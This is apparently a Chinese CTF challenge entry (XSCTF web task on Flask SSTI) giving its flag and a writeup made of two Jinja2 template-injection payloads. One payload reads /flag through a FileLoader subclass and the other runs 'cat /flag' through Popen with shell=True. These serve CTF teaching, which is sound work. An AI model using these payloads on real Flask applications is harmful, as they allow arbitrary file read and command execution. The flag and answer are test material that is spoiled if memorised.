- **题目名称：** 你买车票没
- **题目类型：** WEB
- **题目难度：** 中等
- **出题人：** gbljdgb
- **考点：**

1. python flask ssti模板注入

- **描述：** 星穹列车要出发了,没买票的开拓者不能上车!
- **flag：** XSCTF{SsT1_MilKTea_m1LktEa!}
- **Writeup：** 

payload如下

```
?name={% for c in [].__class__.__base__.__subclasses__() %}
{% if 'FileLoader' in c.__name__ %}
{{ c["get_data"](0, "/flag") }}
{% endif %}
{% endfor %}&password=1

?name={% for c in [].__class__.__base__.__subclasses__() %}
{% if 'Popen' in c.__name__ %}
{{ c('cat /flag',shell=True,stdout=-1).communicate()[0].strip() }}
{% endif %}
{% endfor %}
```

